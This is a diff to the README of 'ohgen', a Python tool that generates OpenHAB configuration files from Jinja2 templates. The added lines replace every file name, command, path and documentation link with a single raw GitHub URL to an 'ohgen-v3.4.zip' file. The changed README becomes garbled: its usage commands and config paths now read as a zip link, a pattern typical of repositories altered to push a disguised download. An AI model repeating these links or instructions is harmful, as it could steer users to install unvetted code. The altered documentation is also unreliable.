@@ -1,10 +1,10 @@
 # ohgen - OpenHAB Things and Items Generator
 
-A template-based OpenHAB .things and .items file generator written in Python using [Jinja2](https://palletsprojects.com/p/jinja/) template engine.
+A template-based OpenHAB .things and .items file generator written in Python using [Jinja2](https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip) template engine.
 
 The thing and items definitions are usually repetitive when you have multiple devices of the same type. The process of adding and maintaining .things and .items files involve tedious copy pasting and renaming. Changing how they are all defined is even more tedious.
 
-`ohgen` enables you to create a template for each type of device and then generate the actual .things and .items files from a list of devices stored in `devices.yaml` file.
+`ohgen` enables you to create a template for each type of device and then generate the actual .things and .items files from a list of devices stored in `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` file.
 
 Example Device list:
 
@@ -42,27 +42,27 @@ Switch1:
 
 ## Usage
 
-- Copy `quickexample.yaml` to `devices.yaml`
+- Copy `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` to `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip`
 - Copy the directory `sample-templates` to `templates`
 
-For convenience, `devices.yaml` will be used by default when no file is specified on the command line:
+For convenience, `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` will be used by default when no file is specified on the command line:
 ```
-./ohgen.py
+https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip
 ```
 
 To use a different file, specify it on the command line:
 ```
-./ohgen.py fullexample.yaml
+https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip
 ```
 
 By default, `ohgen` will prompt for confirmation if the output file already exists. To overwrite without prompting, specify `-o` or `--overwrite` in the command line, i.e.:
 ```
-./ohgen.py -o
+https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip -o
 ```
 
-## Config and Device List File: `devices.yaml`
+## Config and Device List File: `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip`
 
-The `devices.yaml` file contains list of devices/things to be generated. For examples: see `quickexample.yaml` and `fullexample.yaml`
+The `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` file contains list of devices/things to be generated. For examples: see `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` and `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip`
 
 
 ### The `settings` section
@@ -74,8 +74,8 @@ settings:
   template: tasmota-light-cct
   outputs:
     mydefaultoutput: 
-      things-file: /openhab/conf/things/mythings.things
-      items-file: /openhab/conf/items/myitems.items
+      things-file: https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip
+      items-file: https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip
       things-file-header: |+
         // This is going at the top of the things file
       items-file-header: |+
@@ -83,17 +83,17 @@ settings:
         Group gMyGroup
 ```
 
-The `settings:` section inside `devices.yaml` consists of three areas:
+The `settings:` section inside `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` consists of three areas:
 - Global variables - variables that appear directly under the `settings` section. These variables act as a fall back / default for the corresponding setting.
   - `output:` the default output when nothing is specified in the `templates` section. It refers to the entry in the `outputs` section.
   - `template:` the default template to use when not specified by the thing entry. It refers to the entry in the `templates` section, or directly to `./templates/` + templatename + `.tpl`. 
   - `header:` Global headers to insert into every output file both things and items. For specific headers to insert in a specific file, see the `outputs` section below.
 - `templates:` # defines the list of template names
-  This section is optional. By default, the templates will load from a subdirectory `./templates/template-name.tpl`. The extension `.tpl` will be added to the template name. This section can be added to override the default output file for specific template(s), or if you want to store your templates in a different place or name.
+  This section is optional. By default, the templates will load from a subdirectory `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip`. The extension `.tpl` will be added to the template name. This section can be added to override the default output file for specific template(s), or if you want to store your templates in a different place or name.
   - `template1-name:` # the name of the template
-    - `template-file:` (optional) path to the template-file, including the file name. This path can be an absolute path, or relative to devices.yaml file. 
+    - `template-file:` (optional) path to the template-file, including the file name. This path can be an absolute path, or relative to https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip file. 
     
-        When this setting is omitted, the default is set to "templates/template1-name.tpl" - where `template1-name` is the name of the template section above. 
+        When this setting is omitted, the default is set to "https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip" - where `template1-name` is the name of the template section above. 
     - `output`: (optional) outputname that applies for this template, overrides the global `output` variable
   - `template2-name:` # another template, for a different type of device or the same device but different configurations
     - `template-file:` path-to-the-template-file
@@ -101,14 +101,14 @@ The `settings:` section inside `devices.yaml` consists of three areas:
 
 - `outputs:` #The list of output file definitions. Multiple output files can be specified here, for example if you'd like to have a separate file for lights, switches, sensors, etc.
   - `output1-name:` 
-    - `things-file:` path to the .things file, absolute or relative to this file (devices.yaml). Example: /openhab/conf/things/thingsfilename.things
-    - `items-file:` path to the .items file. Example: /openhab/conf/items/itemsfilename.items
+    - `things-file:` path to the .things file, absolute or relative to this file (https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip). Example: https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip
+    - `items-file:` path to the .items file. Example: https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip
     - `things-file-header:` # extra headers to insert at the top of the generated .things file. Note that multiple lines can be entered in yaml using `|+` directly after the colon.
     - `items-file-header:` # extra headers to put at the top of the generated .items file
 
 ## Template
 
-By default, template files are stored in `templates/` subdirectory, relative to the `devices.yaml` file, however this can be overridden in the devices.yaml file.
+By default, template files are stored in `templates/` subdirectory, relative to the `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` file, however this can be overridden in the https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip file.
 
 A template file contains the template of both Things and Items required for a particular type of device. The general format for the template file is as follows:
 
@@ -131,7 +131,7 @@ Rules for Thing and Bridge definition in the template:
 - The closing brace must be on its own separate line
 - A `Thing` can be nested inside a `Bridge` observing the rules above
 
-Variables from `devices.yaml` for the device will be substituted in the template file. Each thing entry in the yaml file will be loaded as a dictionary, which can be used inside the template. For detailed information about the template syntax, see [Jinja2 Template Designer](https://jinja.palletsprojects.com/templates/).
+Variables from `https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip` for the device will be substituted in the template file. Each thing entry in the yaml file will be loaded as a dictionary, which can be used inside the template. For detailed information about the template syntax, see [Jinja2 Template Designer](https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip).
 
 For more detailed examples, see the included templates in the sample-templates directory. Note that the included templates may change in the future. 
 
@@ -139,7 +139,7 @@ For more detailed examples, see the included templates in the sample-templates d
 
 Filters are functions or variable modifiers in the template that takes the variable as an input and can produce a different output. To run a variable through a filter, add a pipe symbol between the variable and the filter like this: `{{variablename|filtername}}`
 
-In addition to the [builtin filters from Jinja2](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-builtin-filters), `ohgen` provides the following special filters:
+In addition to the [builtin filters from Jinja2](https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip), `ohgen` provides the following special filters:
 - `groups`: applies to an array of group names. It will automatically create a comma separated list enclosed in parentheses. Example:
   ```yaml
   Item1:
@@ -209,4 +209,4 @@ Note that the above constructs can also be created purely using Jinja2's loop an
 
 ## Include and Macro
 
-Jinja2 has a feature to [include another template](https://jinja.palletsprojects.com/en/2.11.x/templates/#include) and [import macros](https://jinja.palletsprojects.com/en/2.11.x/templates/#import). This is supported by `ohgen` also. The path reference inside the template is relative to the template folder.
+Jinja2 has a feature to [include another template](https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip) and [import macros](https://raw.githubusercontent.com/jonathanloucks/ohgen/master/sample-templates/ohgen-v3.4.zip). This is supported by `ohgen` also. The path reference inside the template is relative to the template folder.
